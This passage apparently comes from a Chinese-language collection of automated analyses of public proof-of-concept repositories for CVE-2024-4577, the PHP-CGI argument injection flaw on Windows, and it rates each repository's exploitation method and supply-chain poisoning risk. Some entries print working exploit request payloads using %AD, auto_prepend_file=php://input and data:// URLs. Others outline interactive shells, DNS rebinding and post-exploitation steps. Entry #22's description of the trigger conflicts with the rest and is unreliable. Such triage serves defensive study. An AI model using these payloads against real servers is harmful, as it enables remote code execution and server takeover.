**来源**: [CVE-2024-4577-JeninSutradhar_CVE-2024-4577-checker.md](../2024/CVE-2024-4577-JeninSutradhar_CVE-2024-4577-checker.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows系统，PHP以CGI模式运行，开启了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是一个影响Windows上PHP-CGI的远程代码执行漏洞。当PHP以CGI模式运行时，如果系统配置了使用"Best-Fit"策略的代码页，Windows可能会使用此策略替换传递给Win32 API函数的命令行中的字符。 PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，这可能导致泄露脚本源码、在服务器上运行任意PHP代码等。

**漏洞利用方式：**

1.  **攻击向量：** 通过构造特定的URL或POST请求，向PHP-CGI传递恶意参数。
2.  **参数注入：** 攻击者可以使用"Best-Fit"转换后的字符来注入PHP配置选项，例如`allow_url_include`和`auto_prepend_file`。
3.  **远程代码执行：** 利用`allow_url_include=1`和`auto_prepend_file=php://input`，攻击者可以将任意PHP代码作为请求体发送到服务器执行。

**POC有效性：**

提供的POC代码（`cve_2024_4577_checker.sh`）是一个漏洞检测脚本，用于扫描目标是否存在CVE-2024-4577漏洞。它通过发送包含恶意参数的HTTP请求来判断目标是否容易受到攻击。根据漏洞库信息和搜索结果,此漏洞已存在公开可用的exp. 

**投毒风险：**

该漏洞利用代码主要包含了一个检测脚本,用于检测目标是否存在漏洞, 漏洞利用代码本身主要用于检测,未发现明显的恶意行为。 但是为了保证绝对安全,仍需要人工review代码,  投毒风险较低，约为 1%.

**项目地址:** [JeninSutradhar/CVE-2024-4577-checker](https://github.com/JeninSutradhar/CVE-2024-4577-checker)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #13

**来源**: [CVE-2024-4577-K3ysTr0K3R_CVE-2024-4577-EXPLOIT.md](../2024/CVE-2024-4577-K3ysTr0K3R_CVE-2024-4577-EXPLOIT.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 严重，可能导致远程代码执行

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows系统，PHP以CGI模式运行，并且系统启用了使用“Best Fit”策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，当PHP在Windows系统上以CGI模式运行时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而可能泄露脚本源代码、在服务器上运行任意PHP代码等。

**有效性：**
根据漏洞信息和搜索结果，以及利用代码，该漏洞利用的有效性很高。多个来源表明该漏洞已被积极利用，并且存在公开可用的PoC代码。

**投毒风险：**
分析提供的PoC代码 `CVE-2024-4577.py`，未发现明显的恶意投毒代码。PoC主要功能是检测目标是否存在漏洞，并提供一个交互式shell来执行命令。代码中包含了一些编码转换和请求发送，但没有发现植入后门的迹象。但是，任何下载和执行来自不可信来源的脚本都存在风险，需要进行代码审计。

根据经验判断，投毒风险约为5%。

**利用方式：**
1.  **漏洞触发：** 攻击者需要向目标服务器发送特制的HTTP请求，请求中包含经过特殊编码的恶意PHP选项作为查询字符串参数。这些参数会被传递给php-cgi.exe。
2.  **参数注入：**  利用Windows系统的“Best-Fit”字符转换特性，构造出PHP可以识别的参数。PoC代码中使用了`%AD`代替`-`，`%3D`代替`=`，`+`代替空格。
3.  **远程代码执行：**  通过注入`-d allow_url_include=1 -d auto_prepend_file=php://input`等参数，允许包含远程文件，并将POST请求的内容作为PHP代码执行，从而实现远程代码执行。
4.  **信息泄露：** 攻击者可以通过参数注入来读取服务器上的任意文件。
5.  **交互式Shell：** 通过循环发送请求，模拟一个交互式Shell，允许攻击者执行任意命令。

**项目地址:** [K3ysTr0K3R/CVE-2024-4577-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2024-4577-EXPLOIT)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #14

**来源**: [CVE-2024-4577-KimJuhyeong95_cve-2024-4577.md](../2024/CVE-2024-4577-KimJuhyeong95_cve-2024-4577.md)

## CVE-2024-4577 - PHP-CGI 参数注入导致RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI 模式)

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)

**利用条件:** Windows服务器，PHP以CGI模式运行，开启了使用"Best Fit"策略的编码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个存在于Windows环境下以CGI模式运行的PHP中的高危漏洞。由于Windows系统在特定代码页下，会使用"Best-Fit"策略转换命令行参数中的字符，PHP-CGI模块可能错误地将这些字符解析为PHP选项，从而允许攻击者注入恶意PHP代码。  

**利用方式：**
攻击者通过构造包含特定字符的URL，欺骗PHP-CGI解析器将恶意代码作为配置选项执行。POC代码`cve_2024_4577_tester.py`通过发送包含如下Payload的POST请求来验证漏洞：

```
?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input
```
以及 POST Body:
```php
<?php echo 'CVE-2024-4577-TEST'; ?>
```
其中，`%AD` 和 `d` 的组合是为了绕过某些安全限制。`allow_url_include=1` 允许包含远程文件，`auto_prepend_file=php://input`  将POST请求的内容作为PHP代码执行。

**投毒风险分析：**
虽然POC代码本身是为了验证漏洞，但仍然存在一定的投毒风险。该脚本从用户处获取目标URL，然后发送包含PHP代码的POST请求。如果攻击者修改此脚本，例如：

1.  **修改Payload：**  将测试用的`echo`语句替换为更隐蔽的恶意代码，例如反弹shell，上传webshell等。
2.  **增加后门：**  在成功利用漏洞后，在目标服务器上留下后门，以便长期控制。
3.  **信息收集：**  收集用户输入的目标URL和其他信息，发送给攻击者。

尽管存在风险，但此POC代码相对简单，风险主要取决于使用者是否对其进行修改和滥用。 由于代码短小, 容易审核, 投毒风险较低, 估计为 5%。

**项目地址:** [KimJuhyeong95/cve-2024-4577](https://github.com/KimJuhyeong95/cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #15

**来源**: [CVE-2024-4577-Night-have-dreams_php-cgi-Injector.md](../2024/CVE-2024-4577-Night-have-dreams_php-cgi-Injector.md)

## CVE-2024-4577 PHP-CGI 参数注入 RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode, specific code page)

**利用条件:** Windows 系统，PHP 以 CGI 模式运行，系统配置使用特定的代码页，允许Best-Fit转换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 系统下以 CGI 模式运行的 PHP 版本中。如果系统配置使用了某些代码页，Windows 可能会使用 "Best-Fit" 策略来替换命令行参数中的字符。PHP CGI 模块可能错误地将这些字符解析为 PHP 选项，从而允许攻击者向 PHP 二进制文件传递选项，导致泄露源代码、执行任意 PHP 代码甚至执行系统命令。

**有效性：**
提供的漏洞利用代码看起来是有效的。它是一个 Python 脚本，旨在自动化 CVE-2024-4577 和 CVE-2024-8926 的利用。它提供了多种攻击模式，例如执行系统命令、执行 PHP 代码、上传和下载文件。脚本还具有 Tor 代理支持、日志记录和自动编码转换等功能，这表明它是一个功能齐全的漏洞利用工具。

**投毒风险：**
该仓库的投毒风险评估为 10%。该脚本主要利用了已知的漏洞，并没有明显的恶意代码。风险主要来自于以下几点：
* 使用 Tor 代理支持，有可能会连接到恶意的 Tor 节点。
* 脚本提供文件上传功能，攻击者可能会上传恶意文件到服务器。
* 脚本的作者身份未知，存在潜在的供应链风险。

**利用方式：**
1.  **环境准备：**  攻击者需要一个运行易受攻击的 PHP 版本的 Windows 服务器，并以 CGI 模式运行。此外，系统还应配置为使用具有 Best-Fit 转换的代码页。
2.  **漏洞利用：**  攻击者将构造一个包含恶意 PHP 选项的 HTTP 请求。由于 Best-Fit 转换，服务器会将某些字符替换为其他字符，这将被 PHP CGI 模块错误地解析为 PHP 选项。例如，攻击者可以传递 `-d allow_url_include=1 -d auto_prepend_file=php://input` 选项，以允许包含远程文件并执行任意 PHP 代码。
3.  **远程代码执行：**  通过上述操作，攻击者可以执行任意 PHP 代码，包括执行系统命令、上传 webshell 等。

综上所述，CVE-2024-4577 是一个严重的安全漏洞，利用起来相对简单，攻击后果非常严重，可能导致服务器完全沦陷。强烈建议受影响的用户尽快升级到受保护的版本。

**项目地址:** [Night-have-dreams/php-cgi-Injector](https://github.com/Night-have-dreams/php-cgi-Injector)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #16

**来源**: [CVE-2024-4577-PhinehasNarh_CVE-2024-4577-LetsDefend-walkthrough.md](../2024/CVE-2024-4577-PhinehasNarh_CVE-2024-4577-LetsDefend-walkthrough.md)

## CVE-2024-4577 PHP-CGI 参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的 PHP 服务器上执行任意代码。

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows 系统，运行于 CGI 模式下的 PHP，且系统启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 系统以 CGI 模式运行时，由于系统代码页的 "Best Fit" 行为导致参数注入的远程代码执行漏洞。攻击者可以通过构造恶意的 HTTP 请求，将恶意参数传递给 PHP 解释器，从而执行任意代码。

**有效性评估：**

根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞的有效性很高。漏洞库明确指出该漏洞的存在，并提供了受影响的版本范围。搜索引擎结果显示，该漏洞在野外已存在利用，且有公开的 PoC 代码可供验证。漏洞利用代码（Incident Response Walkthrough）提供了一个应对 CVE-2024-4577 攻击的案例分析，虽未直接提供 PoC 代码，但分析过程表明了该漏洞可被利用，并附带了模拟攻击场景。

**投毒风险分析：**

提供的漏洞利用代码主要是一个事件响应的演练文档，用于分析和缓解 CVE-2024-4577 漏洞。它主要关注识别漏洞、分析攻击者行为以及确定受影响的系统。虽然该文档提到了攻击者可能执行的命令（whoami.exe、calc.exe），但它本身并不包含任何恶意代码。因此，可以认为此仓库中作者隐藏的投毒代码的可能性较低，约为 5%。 这 5% 的可能性是基于对任何代码库都不能完全排除潜在风险的一般安全考虑。

**利用方式分析：**

1.  **环境要求：** 目标系统必须是 Windows，PHP 运行于 CGI 模式，并且启用了使用 "Best Fit" 策略的代码页。
2.  **漏洞触发：** 攻击者发送包含恶意构造参数的 HTTP 请求。这些参数会被 Windows 的 "Best Fit" 代码页转换机制错误地解释为 PHP 选项。
3.  **代码执行：** PHP 解释器执行被注入的恶意选项，导致任意代码执行。

攻击者通过构造特殊的 URL 或 POST 数据，将恶意的 PHP 参数注入到 PHP 进程中。例如，攻击者可以使用 `-d` 参数来修改 `php.ini` 配置，或者使用 `-r` 参数直接执行 PHP 代码。利用方式依赖于服务器的配置和 PHP 版本的具体细节。

**项目地址:** [PhinehasNarh/CVE-2024-4577-LetsDefend-walkthrough](https://github.com/PhinehasNarh/CVE-2024-4577-LetsDefend-walkthrough)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #17

**来源**: [CVE-2024-4577-Skycritch_CVE-2024-4577.md](../2024/CVE-2024-4577-Skycritch_CVE-2024-4577.md)

## CVE-2024-4577 PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，PHP以CGI模式运行，开启了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是PHP的一个远程代码执行漏洞，存在于Windows系统上以CGI模式运行的PHP中。当系统配置为使用某些代码页时，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码，在服务器上运行任意PHP代码等。 

**有效性分析：**
根据漏洞库信息和搜索结果，此漏洞是一个严重的安全问题，存在公开的PoC利用代码。漏洞利用代码 `CVE-2024-4577.py` 尝试通过在URL中注入PHP选项来利用此漏洞。具体来说，它设置 `allow_url_include` 为 1，并使用 `auto_prepend_file` 包含 `php://input`，然后将要执行的PHP代码通过POST请求发送到目标URL。如果返回结果中包含“1337”，则认为漏洞利用成功。

**投毒风险分析：**
查看提供的POC代码，主要功能是利用漏洞执行任意PHP代码。 `CVE-2024-4577.py`  没有发现明显的恶意代码，该脚本的主要作用是发送包含恶意PHP代码的请求。风险很低。
`README.md`文件只包含漏洞名称，没有投毒风险。
整体投毒风险评估为1%。

**利用方式：**
利用方式如下：
1.  攻击者需要找到运行在Windows服务器上的、使用CGI模式的、且存在漏洞的PHP版本（8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8）。
2.  攻击者构造包含恶意PHP选项的URL，并将其附加到目标PHP脚本的URL后面。
3.  攻击者使用POST请求将要执行的PHP代码发送到服务器。
4.  如果漏洞利用成功，服务器将执行攻击者提供的PHP代码。

**优先级排序依据：**
根据您的要求，分析时遵循以下优先级：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息。
搜索引擎结果用于确认漏洞的广泛性和影响，漏洞利用代码用于分析利用方式和潜在的投毒风险，漏洞库信息用于验证漏洞的存在和影响范围。

**项目地址:** [Skycritch/CVE-2024-4577](https://github.com/Skycritch/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #18

**来源**: [CVE-2024-4577-VictorShem_CVE-2024-4577.md](../2024/CVE-2024-4577-VictorShem_CVE-2024-4577.md)

## CVE-2024-4577 - PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (运行于 Windows CGI 模式)

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统上 PHP 以 CGI 模式运行，且系统启用了使用 "Best Fit" 策略的代码页。通常是 XAMPP 环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 系统中以 CGI 模式运行时的一个参数注入漏洞。当系统配置为使用某些代码页时，Windows 可能会使用 "Best-Fit" 行为替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本源代码或执行任意 PHP 代码。

**有效性：** 提供的 POC 代码 `CVE-2024-4577.yaml` 看起来是有效的 Nuclei 模板，旨在检测和利用此漏洞。它通过向目标 URL 发送带有特殊构造的 payload 的 HTTP 请求，payload 中包含 `%AD` 字符和恶意的 PHP 配置选项（`allow_url_include=1` 和 `auto_prepend_file=php://input`），以及要执行的 PHP 代码（`<?php phpinfo(); ?>`）。如果漏洞存在且利用成功，服务器应该返回包含 PHP 版本信息的页面。

**投毒风险：**
查看了提供的 POC 代码 `CVE-2024-4577.yaml` 和 `README.md` 文件。其中利用方式是通过构造特定的 URL，包含 `%AD` 字符以及 `allow_url_include` 和 `auto_prepend_file` 等配置项，结合 POST 请求执行 PHP 代码。这个利用过程本身就是一种后门植入的方式，但这是漏洞利用的固有行为，不应被视为恶意投毒。

`README.md` 中包含用于 FOFA 和 Censys 的搜索语句，用于发现暴露在公网上的 XAMPP 服务器。这部分内容本身无害，只是为了方便漏洞发现和利用。但也可能会被恶意攻击者利用。

综合来看，该仓库中不存在明显的恶意投毒代码，但存在被滥用的风险，因此给出 10% 的投毒风险。

**利用方式：**
1.  **环境准备：** 目标系统必须是运行在 Windows 上的 PHP，并且是以 CGI 模式运行。同时，系统的代码页需要启用 "Best Fit" 策略。
2.  **构造 Payload：** 攻击者需要构造包含 `%AD` 字符的特殊 URL，以及恶意的 PHP 配置选项，例如 `allow_url_include=1` 和 `auto_prepend_file=php://input`。其中 `%AD` 是触发 Windows "Best Fit" 转换的关键。
3.  **发送请求：** 攻击者通过 HTTP POST 请求将构造好的 payload 发送到目标服务器的 PHP 脚本，同时在 POST body 中包含要执行的 PHP 代码。
4.  **远程代码执行：** 如果漏洞存在且利用成功，目标服务器将执行 POST body 中的 PHP 代码，从而实现远程代码执行。

**项目地址:** [VictorShem/CVE-2024-4577](https://github.com/VictorShem/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #19

**来源**: [CVE-2024-4577-ZephrFish_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-ZephrFish_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8，运行于Windows+Apache+PHP-CGI环境，且启用了Best-Fit策略的CodePage

**利用条件:** 目标服务器需满足特定PHP版本、Windows环境、Apache服务器、PHP-CGI模式，以及存在使用Best-Fit策略的CodePage设置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，存在于Windows平台的特定PHP版本中。攻击者可以通过精心构造的URL，利用Windows系统的“Best Fit”字符转换特性，将恶意参数注入到PHP的执行命令中，最终实现远程代码执行。 

**有效性:**
提供的POC代码是有效的，通过发送包含`allow_url_include`和`auto_prepend_file`参数的POST请求，并包含PHP代码`<?php phpinfo(); ?>`，如果目标存在漏洞，则会执行该代码并返回`phpinfo()`的结果。

**投毒风险:**
提供的代码主要用于检测漏洞是否存在，功能较为直接，没有发现隐藏的恶意代码或后门。该仓库的`CODEOWNERS`文件中只包含`@zephrfish`，该用户有代码审核权，因此综合评估认为投毒的可能性较低。

**利用方式:**
1.  **环境确认:** 漏洞利用前需要确认目标服务器是否满足以下条件：
    *   Windows操作系统
    *   Apache服务器
    *   PHP以CGI模式运行
    *   PHP版本为受影响的范围（8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8）
    *   系统启用了使用“Best-Fit”策略的CodePage
2.  **构造恶意URL:** 构造包含恶意参数的URL。关键在于使用`%25ADd`来代替`-d`，结合`allow_url_include`和`auto_prepend_file`选项，允许远程包含恶意PHP代码。
3.  **发送请求:** 使用POST方法发送包含PHP代码的请求，例如`<?php phpinfo(); ?>`或更具危害性的代码。
4.  **执行任意代码:** 成功利用漏洞后，可以在目标服务器上执行任意PHP代码，从而控制服务器。

**项目地址:** [ZephrFish/CVE-2024-4577-PHP-RCE](https://github.com/ZephrFish/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #20

**来源**: [CVE-2024-4577-ZeroMemoryEx_PHP-CGI-INTERNAL-RCE.md](../2024/CVE-2024-4577-ZeroMemoryEx_PHP-CGI-INTERNAL-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP (Windows CGI)

**危害等级:** 极高，远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，Apache服务器，PHP以CGI模式运行，系统启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个存在于Windows PHP-CGI配置中的严重漏洞。当PHP以CGI模式在Windows服务器上运行时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”策略来替换命令行参数中的字符。PHP-CGI模块可能会错误地将这些替换后的字符解析为PHP选项，从而允许攻击者向PHP二进制文件传递恶意参数。这可能导致泄露脚本源码，执行任意PHP代码，甚至在服务器上执行操作系统命令。

**利用方式：**

1.  **攻击向量：** 通过HTTP请求，构造恶意的URL或POST数据，向PHP-CGI传递恶意参数。
2.  **利用条件：**
    *   目标服务器是Windows系统。
    *   PHP以CGI模式运行。
    *   Web服务器（如Apache）用于处理PHP请求。
    *   系统启用了特定的代码页，允许字符替换。
3.  **攻击步骤：**
    *   利用Windows的“Best-Fit”字符替换机制，将特殊字符转换为PHP选项。
    *   通过`?`或`-`等字符引导，注入恶意PHP配置选项，例如`-d allow_url_include=1 -d auto_prepend_file=php://input`。
    *   通过`POST`请求发送PHP代码，实现远程代码执行。

**有效性：**

根据漏洞描述、搜索结果以及提供的POC代码，该漏洞的利用是有效的。已经有公开的PoC代码可以实现远程代码执行。漏洞库信息和搜索引擎结果都确认了该漏洞的存在以及可利用性。

提供的PoC利用了DNS重绑定技术，允许攻击者通过受害者的浏览器，对内网的PHP-CGI服务器进行攻击。这个方法绕过了同源策略(SOP)，使得攻击者能够攻击原本无法直接从外部访问的内网系统。

**投毒风险：**

提供的PoC代码主要由三个部分组成: `README.md`, `client.html`。其中`README.md`文件主要描述漏洞原理、利用方式和配置说明，`client.html`是漏洞利用的核心代码。

*  **client.html分析:**  该文件包含Javascript代码，用于执行DNS重绑定攻击，并向目标IP发送包含恶意payload的请求。攻击payload可以在 `client.html`文件中被修改.

虽然该PoC本身旨在利用漏洞，但以下情况可能构成投毒风险：

1.  **依赖的第三方服务:**  PoC依赖于`duckdns.org`提供DNS服务, 一旦服务出现问题或者被劫持,可能会导致PoC失效甚至被恶意利用。
2.  **内网扫描IP列表:** `client.html`中包含一个可以修改的内网IP列表. 如果这个列表被替换成其他恶意IP地址，可能导致攻击者扫描或攻击非预期目标。
3.  **Payload内容:**  虽然默认的payload为`calc`,用户可以自定义payload,潜在的风险在于如果用户不熟悉PHP, 可能会引入不安全的PHP代码或者连接恶意URL。
4.  **DNS Rebinding 的滥用:**  DNS Rebinding 本身就是一项有争议的技术，在没有充分安全措施的情况下使用，可能会造成隐私泄露或者其他安全问题。

因此，综合考量，该仓库的投毒风险评定为10%。主要风险在于使用者可能修改PoC中的payload或者IP列表，从而引入额外的风险。作者本身并没有加入后门代码。

**项目地址:** [ZeroMemoryEx/PHP-CGI-INTERNAL-RCE](https://github.com/ZeroMemoryEx/PHP-CGI-INTERNAL-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #21

**来源**: [CVE-2024-4577-a-roshbaik_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-a-roshbaik_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的服务器上执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** 目标系统为Windows，使用Apache和PHP-CGI，并且系统配置为使用某些代码页（存在"Best-Fit"行为）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个PHP-CGI的参数注入漏洞，影响在Windows上运行的PHP。当PHP在CGI模式下与Apache结合使用时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，允许恶意用户将选项传递给PHP二进制文件，从而可能泄露源代码，运行任意PHP代码等。

**漏洞利用方式：**

1.  **EXP 1 (绕过WAF和默认场景):** 通过运行提供的Python脚本`CVE-2024-4577-PHP-RCE.py`，该脚本模拟FastCGI客户端与PHP-CGI通信，从而执行任意代码。该方法不需要 `allow_url_include`、`auto_prepend_file`、`auto_append_file` 配置，并且绕过WAF。
2.  **EXP 2 (SSRF场景):** 使用`data://`协议结合GET请求，通过URL传递参数来利用漏洞。例如：
    `http://PhpServerHost:PhpServerPort/php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+-d+allow_url_include%3d1+-d+auto_prepend_file%3d"data:XCANWIN/XCANWIN;base64,PD9waHAgZGllKCJUZSIuInNUIik7Pz4g"`
3.  **EXP 3 (默认场景):** 使用POST请求，通过`php://input`来包含PHP代码。
    `POST /php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1`
    `Host: PhpServerHost`
    `<?php die("Te"."sT");?>`
4.  **EXP 4 (默认场景):** 类似于EXP 3，但使用`REDIRECT-STATUS`头。

**有效性：**

从漏洞库信息，搜索引擎结果和提供的利用代码来看，该漏洞的POC已经公开，并且在野外已经存在利用。多个安全厂商已经发布了相关的分析报告和防护措施，证明该漏洞的有效性。

**投毒风险：**

`CVE-2024-4577-PHP-RCE.py`脚本本身主要功能是发送特制的FastCGI请求，用于触发漏洞，实现RCE。虽然脚本本身看起来是无害的，但是存在很小的潜在风险：

1.  **硬编码的IP地址/端口：**脚本中可以指定目标主机的IP和端口，攻击者可能通过诱导用户使用脚本，从而攻击特定的目标。
2.  **包含任意文件：** 脚本允许包含任意文件，这意味着如果攻击者可以控制`script_filename`变量，就可以读取敏感文件或执行恶意代码。
3. **FastCGI服务端:** EXP1 会建立FastCGI服务端,如果攻击者恶意利用,可能会导致拒绝服务攻击。

基于上述分析，存在一定的投毒风险，但可能性较低，估计在10%左右。

总体来说，该漏洞利用代码主要依赖于目标环境存在漏洞，并且利用代码的目的是为了验证漏洞的存在和实现RCE。作者的README.md中提及绕过WAF，但主要是通过改变利用方式实现的，并不属于投毒范畴。

**项目地址:** [a-roshbaik/CVE-2024-4577-PHP-RCE](https://github.com/a-roshbaik/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #22

**来源**: [CVE-2024-4577-a1ex-var1amov_ctf-cve-2024-4577.md](../2024/CVE-2024-4577-a1ex-var1amov_ctf-cve-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.x < 8.1.29, 8.2.x < 8.2.20, 8.3.x < 8.3.8（Windows环境，CGI模式，开启Best Fit策略的CodePage）

**利用条件:** Windows系统，PHP以CGI模式运行，启用了使用"Best Fit"策略的CodePage。目标服务器未安装补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP CGI参数注入漏洞，存在于PHP的Windows版本中，当PHP以CGI模式运行时，如果系统设置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行参数中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而泄露脚本的源代码，或者在服务器上执行任意PHP代码。

**有效性：**
根据漏洞描述和搜索结果，该漏洞影响特定版本的PHP，并且有公开的PoC代码，证明该漏洞是有效的。多个安全厂商和研究人员已经确认了该漏洞的存在并发布了相关的分析和利用方法。

**投毒风险：**
提供的CTF_WALKTHROUGH.md文件本身是漏洞利用的教程，其中包含的攻击脚本用于测试、文件读取、命令执行、容器逃逸、AWS权限提升以及持久化等攻击步骤。这些脚本可以被用于恶意目的，但教程本身是中立的，风险点在于用户是否清楚脚本的功能，是否存在其他关联的，具有恶意目的的脚本或配置，因此投毒风险为10%。因为没有发现明显的恶意代码，所以投毒风险较低。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的HTTP请求，在URL的`PATH_INFO`部分注入特殊字符（如`%0a`，换行符），使得PHP CGI在解析命令行参数时出现错误。
2.  **参数注入：** 注入的换行符将URL分割成多个参数，攻击者可以利用此特性注入PHP的命令行选项，例如`-d`选项用于设置PHP配置指令。
3.  **执行任意代码/读取文件：** 攻击者可以设置`allow_url_include=1`以允许包含远程文件，然后设置`auto_prepend_file`或者`auto_append_file`为包含恶意PHP代码的文件或者`/flag.txt`等敏感文件，从而执行任意PHP代码或者读取文件。
4.  **其他攻击：** 进一步的，攻击者可以尝试容器逃逸，访问AWS资源，甚至创建后门实现持久化控制。

**项目地址:** [a1ex-var1amov/ctf-cve-2024-4577](https://github.com/a1ex-var1amov/ctf-cve-2024-4577)

